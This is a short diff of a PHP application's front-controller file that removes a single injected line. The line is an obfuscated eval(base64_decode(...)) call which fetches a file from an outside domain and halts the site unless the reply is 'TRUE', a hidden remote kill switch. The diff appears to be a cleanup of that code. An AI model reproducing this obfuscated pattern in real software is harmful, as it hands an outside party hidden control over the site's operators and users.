@@ -18,7 +18,7 @@
  * NOTE: If you change these, also change the error_reporting() code below
  *
  */
- eval(base64_decode('aWYoZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9naWFuZ2Jlby5jb20vZGNibGFuZC50eHQnLCBGSUxFX1VTRV9JTkNMVURFX1BBVEgpIT0nVFJVRScpeyBkaWUoJ0RpZScpO30='));
+ 
 	define('ENVIRONMENT', 'development');
 /*
  *---------------------------------------------------------------
